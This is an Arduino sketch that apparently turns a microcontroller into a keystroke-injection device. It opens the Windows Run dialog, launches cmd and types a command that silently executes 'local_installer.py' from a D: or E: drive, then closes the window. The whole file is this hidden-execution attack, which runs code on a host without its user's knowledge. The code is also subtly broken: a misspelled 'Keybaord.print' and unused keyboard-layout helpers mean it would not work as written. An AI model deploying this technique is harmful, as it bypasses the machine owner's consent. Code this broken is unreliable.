#include <Keyboard.h>

// Function to type ':'
void typeColon() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('.');
  delay(30);
  Keyboard.releaseAll();
}

// Function to type '/'
void typeSlash() {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('ß');
  delay(30);
  Keyboard.releaseAll();
}

// Function to type '&'
void typeAnd() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('6');
  delay(30);
  Keyboard.releaseAll();
}

// Function to type '\'
void typeBackslash() {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('-');
  delay(30);
  Keyboard.releaseAll();
}

// Function to type '('
void typeLeftParenthesis() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('8');
  delay(30);
  Keyboard.releaseAll();
}

// Function to type ')'
void typeRightParenthesis() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('9');
  delay(30);
  Keyboard.releaseAll();
}

// function to type '='
void typeEquals() {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('0');
  delay(30);
  Keyboard.releaseAll();
}

void setup() {
  // start the Keyboard communication
  Keyboard.begin();

  // delay to allow the computer to recognize the usb drive before the script runs
  delay(5000);

  // open cmd (Windows + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(60);
  Keyboard.releaseAll();
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(60);
  Keyboard.releaseAll();

  delay(400);

  // Execute installer command with special characters
  Keybaord.print("if exist D:\local_installer.py (call D:\local_installer.py && exit) else if exist E:\local_installer.py (call E:\local_installer.py && exit) else (exit)");

  delay(100);
  Keyboard.releaseAll();
  
  // end the keyboard communication
  Keyboard.end();
}

void loop() {
  // empty loop
}
